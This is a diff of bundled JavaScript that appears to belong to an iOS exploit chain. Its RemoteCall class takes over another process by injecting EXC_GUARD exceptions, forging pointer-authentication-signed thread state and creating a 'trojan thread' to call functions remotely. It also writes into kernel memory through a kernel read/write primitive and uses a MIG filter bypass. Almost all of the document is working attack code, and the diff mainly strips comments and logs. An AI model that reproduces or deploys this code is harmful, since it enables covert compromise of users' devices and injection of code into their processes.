+ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/TaskRop/Thread.js");
+ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__( "./src/libs/TaskRop/Exception.js");
+ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__( "./src/libs/TaskRop/ExceptionMessageStruct.js");
+ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__( "./src/libs/TaskRop/ThreadState.js");
+ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__( "./src/libs/TaskRop/PAC.js");
+ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__( "./src/libs/TaskRop/VM.js");
+ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__( "./src/libs/TaskRop/VMShmem.js");
+ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__( "./src/libs/TaskRop/MachMsgHeaderStruct.js");
+ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__( "./src/libs/TaskRop/PortRightInserter.js");
 
 
 
@@ -5225,10 +4998,10 @@ __webpack_require__.r(__webpack_exports__);
 
 
 
-//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
-//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'
 
-//import Offsets from "Driver/Offsets";
+
+
+
 
 const TAG = "REMOTECALL"
 const GUARD_TYPE_MACH_PORT = 0x1n;
@@ -5268,7 +5041,7 @@ class RemoteCall
 	#localPort;
 	#remotePort;
 	#shmemCache = new Array(SHMEM_CACHE_SIZE);
-	//#exceptionThreadCFString;
+	
 	#success = false;
 	#threadList = [];
 	#krwControlFd;
@@ -5281,14 +5054,14 @@ class RemoteCall
 		{
 			console.log(TAG,`Getting task by name: ${param}`);
 			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
-			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
+			
 		}
 		else
 		{
 			console.log(TAG,`Getting task by pid: ${param}`);
 			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByPID(param);
 			this.#pid = param;
-			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
+			
 		}
 
 		if(!this.#taskAddr)
@@ -5297,21 +5070,7 @@ class RemoteCall
 			return null;
 		}
 
-		/*
-		let threadmMem = 0n;
-		const buildVer = Offsets.getBuildVersion();
-		if(buildVer && buildVer.startsWith("22"))
-		{
-			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
-			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
-		}
-		else
-		{
-			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
-			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
-		}
-		//Native.callSymbol("free", threadmMem);
-		*/
+		
 
 		let firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
 		let secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
@@ -5323,7 +5082,7 @@ class RemoteCall
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
 			return null;
 		}
-		// Make sure the task won't crash after we handle an exception
+		
 		_Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(this.#taskAddr);
 
 		let guardCode = 0n;
@@ -5332,12 +5091,12 @@ class RemoteCall
 		guardCode = this.#EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503n);
 		let firstPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(firstExceptionPort);
 		let secondPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(secondExceptionPort);
-		//console.log(TAG,`Exception port 1:${Utils.hex(firstExceptionPort)} with kAddr:${Utils.hex(firstPortAddr)}`);
-		//console.log(TAG,`Exception port 2:${Utils.hex(secondExceptionPort)} with kAddr:${Utils.hex(secondPortAddr)}`);
+		
+		
 
 		let dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		let dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
-		//console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);
+		
 		
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
 		dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
@@ -5348,14 +5107,14 @@ class RemoteCall
 		let selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
 		let selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);
 	
-		//console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
-		//console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
-		//console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);
+		
+		
+		
 	
-		//console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
-		//console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
-		//console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
-		//console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);
+		
+		
+		
+		
 		
 		this.#creatingExtraThread = true;
 		this.#firstExceptionPort = firstExceptionPort;
@@ -5394,7 +5153,7 @@ class RemoteCall
 				else
 					break;
 			}
-			//console.log(TAG,`Trying Inject EXC_GUARD on thread:${Utils.hex(currThread)} with tro task:${Utils.hex(task)}`);
+			
 			if (task == this.#taskAddr)
 			{
 				if (!this.#setExceptionPortOnThread(this.#firstExceptionPort, currThread, migFilterBypass))
@@ -5410,7 +5169,7 @@ class RemoteCall
 				}
 				else
 				{
-					// Inject a EXC_GUARD exception on this thread
+					
 					if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].injectGuardException(currThread, guardCode))
 					{
 						console.log(TAG,`Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
@@ -5469,7 +5228,7 @@ class RemoteCall
 		}
 
 		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
-		// Since we are in background, we don't mind to wait a lot!
+		
 		if(!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort,excBuffer,120000,false))
 		{
 			console.log(TAG, `Failed to receive first exception`);
@@ -5477,10 +5236,10 @@ class RemoteCall
 			return null;
 		}
 
-		//console.log(TAG,`Got first exception succesfully`);
+		
 		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
-		// Save state to restore its execution after trojan thread creation TODO make it inside ThreadState to copy thread state to another variable
+		
 		let originalStateBuff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64_SIZE);
 		this.#originalState = new _ThreadState__WEBPACK_IMPORTED_MODULE_7__["default"](originalStateBuff);
 		for(let i = 0; i < 29; i++)
@@ -5494,16 +5253,16 @@ class RemoteCall
 		this.#originalState.cspr = exc.threadState.cspr;
 		this.#originalState.opaque_flags = exc.threadState.opaque_flags;
 	
-		//console.log(TAG,`Clear EXC_GUARD from all other threads...`);
+		
 
 		for(let i = 0; i < this.#threadList.length;i++)
 		{
 			_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
-			//console.log(TAG,`Clear EXC_GUARD on thread:${Utils.hex(this.#threadList[i])} OK`);
+			
 		}
 		console.log(TAG,`Finish clearing EXC_GUARD from all other threads...`);
 		let desiredTimeout = 1500;
-		// Flush exceptions in other threads (is that really needed?)
+		
 		while (true)
 		{
 			let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
@@ -5511,45 +5270,45 @@ class RemoteCall
 				break;
 			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
-			//threadClearGuardException(remoteCall->trojanThreadAddr);
+			
 			_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, exc.threadState,false);
 		}
-		//console.log(TAG,`finished flushing exceptions`);
+		
 		let newState = exc.threadState;
-		//console.log(TAG,`gadget_pacia:${Utils.hex(PAC.gadget_pacia)}`);
+		
 		newState = this.#signState(firstThread, newState, fakePCTrojanCreator, fakeLRTrojanCreator);
-		//console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
+		
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
-		//console.log(TAG,`Trojan thread created`);
 		
-		//console.log(TAG,`Test remote getpid()`);
-		//let pidRemote = this.#doRemoteCallTemp(100, "getpid");
-		//console.log(TAG,`pidRemote:${pidRemote}`);
 		
-		// Use stack as a temporary remote memory
+		
+		
+		
+		
+		
 		let trojanMemTemp = exc.threadState.opaque_sp & 0x7fffffffffn;
-		//console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);
 		
-		// Substracting a bit from stack pointer to not corrupt original stack
+		
+		
 		trojanMemTemp = trojanMemTemp - 0x100n;
 
 		this.#vmMap = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getMap(this.#taskAddr);
-		//console.log(TAG,`vmMap:${Utils.hex(this.#vmMap)}`);
+		
 
-		// Create a remote pthread that should always crash on first execution, so we can control it with exceptions.
+		
 		let remoteCrashSigned = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, fakePCTrojan, 0n);
-		//console.log(TAG,`remoteCrashSigned:${Utils.hex(remoteCrashSigned)}`);
+		
 
 		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
-		//console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
-		//VM.mocker(0x221d54,0xffffffdc08875500n);
+		
+		
 		
 		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
-		//console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);
 		
-		// Get mach port of the new thread and set exception port on it.
+		
+		
 		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);
-		//console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);
+		
 
 		if (callThreadPort == 0n)
 		{
@@ -5558,8 +5317,8 @@ class RemoteCall
 			return null;
 		}
 		this.#callThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObjectOfTask(this.#taskAddr, BigInt(callThreadPort));
-		//console.log(TAG,`Call thread addr:${Utils.hex(this.#callThreadAddr)}`);
-		// Note that this exception port is not the same of the initial exception port we use for existing threads.
+		
+		
 
 		if (migFilterBypass)
 			migFilterBypass.resume();
@@ -5588,9 +5347,9 @@ class RemoteCall
 		
 		console.log(TAG,`All good so far! Now we resume trojan thread...`);
 
-		// Ok, now we are ready to start this thread and catch exceptions on it.
+		
 		ret = this.#doRemoteCallTemp(100, "thread_resume", callThreadPort);
-		//console.log(TAG,`thread_resume():${ret}`);
+		
 		if (ret !== 0n)
 		{
 			console.log(TAG,`Couldn't resume newly created thread, falling back to use original one only`);
@@ -5604,19 +5363,19 @@ class RemoteCall
 		}
 		console.log(TAG, `Original thread restored succesfully`);
 
-		// From this point on, the "stable" trojan thread is ready to process calls.
-		//console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
+		
+		
 		this.#pid = this.#doRemoteCallStable(100, "getpid");
 		console.log(TAG, `Task pid: ${this.#pid}`);
 		
-		//this.#trojanMem = trojanMemTemp;
-		//this.#testRWPrim();
-
-		// Allocate a general purpose remote page mem.
-		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
-		//console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);
 		
-		// Memory must be written at least once (COW) to be found in vmMap.
+		
+
+		
+		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
+		
+		
+		
 		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
 
 		this.#success = true;
@@ -5667,19 +5426,14 @@ class RemoteCall
 
 	#signState(SigningThread,state,pc,lr)
 	{
-		//console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
+		
 		let diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
-		//console.log(TAG,`diver after:${Utils.hex(diver)}`);
+		
 		let discPC = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("pc"));
 		let discLR = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("lr"));
-		//console.log(TAG,`discPC:${Utils.hex(discPC)}`);
-		//console.log(TAG,`discLR:${Utils.hex(discLR)}`);
-		/* C wrapper for ptrauth utils
-		discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
-		discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
-		console.log(TAG,`discPC after:${Utils.hex(discPC)}`);
-		console.log(TAG,`discLR after:${Utils.hex(discLR)}`);
-		*/
+		
+		
+		
 		if (pc)
 		{
 			state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
@@ -5702,25 +5456,25 @@ class RemoteCall
 		let thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
 		let pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");
 
-		//console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
-		//console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
-		//console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));
+		
+		
+		
 
-		//let stackMem = Native.callSymbol("malloc", 0x8000);
-		//let thread_set_exception_ports_addr = Native.dlsym("_exit");
-		//let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
-		//let state = new ThreadState(stateBuff);
+		
+		
+		
+		
 
-		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
+		
 		
 		let pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
 		let pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
-		//console.log(TAG, "pthread: " + Utils.hex(pthread));
+		
 
 		let machThread = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", pthread));
 		let machThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(machThread);
-		//console.log(TAG, `machThread:${Utils.hex(machThread)} machThreadAddr:${Utils.hex(machThreadAddr)}`);
+		
 
 		if (migFilterBypass)
 			migFilterBypass.monitorThreads(this.#selfThreadAddr, machThreadAddr);
@@ -5731,25 +5485,25 @@ class RemoteCall
 			return false;
 		}
 
-		//console.log(TAG, "thread_get_state OK");
+		
 
 		state.opaque_pc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(thread_set_exception_ports_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("pc"));
 		state.opaque_lr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(pthread_exit_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("lr"));
-		//state.opaque_sp = stackMem + 0x4000n;
+		
 		state.registers.set(0, this.#dummyThreadMach);
 		state.registers.set(1, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_GUARD | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_BAD_ACCESS);
 		state.registers.set(2, exceptionPort);
 		state.registers.set(3, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES);
 		state.registers.set(4, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64);
 
-		//console.log(TAG, "pc: " + Utils.hex(state.opaque_pc));
-		//console.log(TAG, "lr: " + Utils.hex(state.opaque_lr));
-		//console.log(TAG, "sp: " + Utils.hex(state.opaque_sp));
-		//console.log(TAG, "x0: " + Utils.hex(state.registers.get(0)));
-		//console.log(TAG, "x1: " + Utils.hex(state.registers.get(1)));
-		//console.log(TAG, "x2: " + Utils.hex(state.registers.get(2)));
-		//console.log(TAG, "x3: " + Utils.hex(state.registers.get(3)));
-		//console.log(TAG, "x4: " + Utils.hex(state.registers.get(4)));
+		
+		
+		
+		
+		
+		
+		
+		
 
 		if (migFilterBypass)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
@@ -5757,7 +5511,7 @@ class RemoteCall
 		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state))
 			return false;
 
-		//console.log(TAG, "Thread.setState() OK");
+		
 
 		if (migFilterBypass)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
@@ -5767,99 +5521,74 @@ class RemoteCall
 		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread))
 			return false;
 
-		//console.log(TAG, "Thread resume OK");
+		
 
-		/*
-		let threadmem = Native.callSymbol("malloc",0x400);
-		Native.write64(threadmem + 0x100n, this.#dummyThreadMach);
-		Native.write64(threadmem + 0x108n, exceptionPort);
-		Native.callSymbol("usleep",100n);
-		Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
-		let timeout = 10000n;
-		if(largeTimeout)
-			timeout = 30000n;
-		Native.callSymbol("usleep",timeout);
-		let machThread = Native.read64(threadmem + 0x100n);
-		Native.callSymbol("free",threadmem);
-		let machThreadAddr = 0n;
-		if(machThread == this.#dummyThreadMach)
-		{
-			console.log(TAG,`remote thread didn't succeed, aborting`);
-			Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
-			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-			// This will wake up setter
-			Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
-			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-			return false;
-		}
-		else
-			machThreadAddr = Task.getPortKObject(machThread);
-		*/
+		
 
-		//Native.callSymbol("usleep",100n);
-		//kr = Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-		//console.log(TAG, "thread_switch: " + kr);
-		//if (!machThreadAddr)
-		//{
-		//	console.log(TAG,`Unable to get machThreadAddr`);
-			//return false;
-		//}
-		//console.log(TAG, "Successfully switched to new mach thread");
+		
+		
+		
+		
+		
+		
+			
+		
+		
 
-		//Native.callSymbol("sleep", 2);
-		//Native.callSymbol("usleep", 100000);
+		
+		
 
-		//Native.callSymbol("sleep", 1);
+		
 
 		for (let i=0; i<10; i++) {
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 200000);
 
 			let kstack = 0x0n;
-			//let retries = 0n;
-			//while (true && !kstack && retries < 100000n)
-			//{
-			//	//Native.callSymbol("usleep",100n);
-			//	kstack = Thread.getStack(machThreadAddr);
-			//	retries++;
-			//}
+			
+			
+			
+			
+			
+			
+			
 			kstack = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getStack(machThreadAddr);
 			if (!kstack)
 			{
 				console.log(TAG,`Failed to get kstack. Retry...`);
 				continue;
 			}
-			//console.log(TAG,`kstack:${Utils.hex(kstack)}`);
-			// Waiting a bit longer to make sure pointer is valid
-			//Native.callSymbol("usleep",10000n);
-			//console.log(TAG,`Current mutex:${Utils.hex(Thread.getMutex(this.#dummyThreadAddr))}`);
-			//uwrite64(threadmem + 0x100n,0x0n); // instead of free
+			
+			
+			
+			
+			
 			let kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE * 12);
 			let kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(kstack + kernelSPOffset);
 			if (!kernelSP) {
 				console.log(TAG, "Failed to get SP. Retry...");
 				continue;
 			}
-			//console.log(TAG,`kernelSP:${Utils.hex(kernelSP)}`);
-			//Native.callSymbol("usleep",20000n);
+			
+			
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",100n);
-			//let data = Native.callSymbol("malloc",0x1000n);
-			//console.log(TAG,`Before reading from page`);
+			
+			
 			let dataBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].readBuff(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + 0x3000n, 0x1000);
 			if (!dataBuff) {
 				console.log(TAG, "Failed to read from kernel SP. Aborting...");
 				break;
 			}
-			//console.log(TAG,`Second read finished succesfully`);
-			//Native.callSymbol("usleep",100n);
-			//let dataBuff = Native.read(data,0x1000);
-			//Native.callSymbol("free",data);
+			
+			
+			
+			
 
-			//let troPointer = Native.mem;
+			
 			let buffer = new ArrayBuffer(8);
 			const view = new DataView(buffer);
 			view.setBigUint64(0,this.#dummyThreadTro,true);
 			let found = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].memmem(dataBuff,buffer);
-			//console.log(TAG,`found:${Utils.hex(found)}`);
+			
 			found = BigInt(found) + 0x3000n;
 			let correctTro = false;
 			let val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
@@ -5871,14 +5600,14 @@ class RemoteCall
 				console.log(TAG, "Wrong tro. Retry...");
 				continue;
 			}
-				//console.log(TAG,`Wrong tro, skipping this thread`);
+				
 			if (found && correctTro)
 			{
-				//console.log(TAG,`Found TRO!`);
+				
 				if(_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread) == this.#taskAddr)
 				{
 					let tro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(currThread);
-					//console.log(TAG,`tro:${Utils.hex(tro)}`);
+					
 					libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write64(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + BigInt(found), tro);
 					success = true;
 					break;
@@ -5894,20 +5623,20 @@ class RemoteCall
 			}
 		}
 
-		//console.log(TAG,`Injecting into:${Utils.hex(currThread)}`);
-		// Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
-		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
+		
+		
+		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, 0x40000000); 
 
-		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-		// This will wake up setter
+		
+		
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, exceptionPort , libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64));
-		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-		//Native.callSymbol("usleep",40000n);
-		//console.log(TAG,`After second thread switch`);
-		//pthread_join(setExceptionThread, NULL);
-		//mpd_js_thread_join(th);
-		//free(data);
-		//console.log(TAG,`Finish injecting into:${Utils.hex(currThread)}`);
+		
+		
+		
+		
+		
+		
+		
 
 		if (migFilterBypass)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
@@ -5928,9 +5657,9 @@ class RemoteCall
 		x7 = 0n)
 	{
 		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
-		//Calculate actual pc addr
+		
 		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
-		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
+		
 		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
 		{
@@ -5939,7 +5668,7 @@ class RemoteCall
 		}
 		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
-		// Set the new state
+		
 		let newState = exc.threadState;
 		newState.registers.set(0,x0);
 		newState.registers.set(1,x1);
@@ -5953,13 +5682,13 @@ class RemoteCall
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 		exc.threadState.registers.set(0,x0);
 	
-		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
+		
 		if (timeout < 0)
 		{
 			console.log(TAG,`Trojan thread cleanup`);
 			return 0;
 		}
-		// Wait for the exception on LR corruption, so we can get return value of the call.
+		
 		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
 		{
 			console.log(TAG,`Don't receive second exception on original thread`);
@@ -5969,10 +5698,10 @@ class RemoteCall
 		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
 		let retValue = exc.threadState.registers.get(0);
 	
-		// Corrupt again PC so we can control flow for the next call.
+		
 		newState = exc.threadState;
-		// Can be therotical used one previous implementation doesn't set LR
-		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
+		
+		
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 	
 		return retValue;
@@ -5993,14 +5722,14 @@ class RemoteCall
 		if (!this.#creatingExtraThread)
 			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
 			
-		//Calculate actual pc addr
+		
 		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
 		if (!pcAddr) {
 			console.log(TAG, "Unable to find symbol: " + name);
 			return 0;
 		}
 		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
-		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
+		
 		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
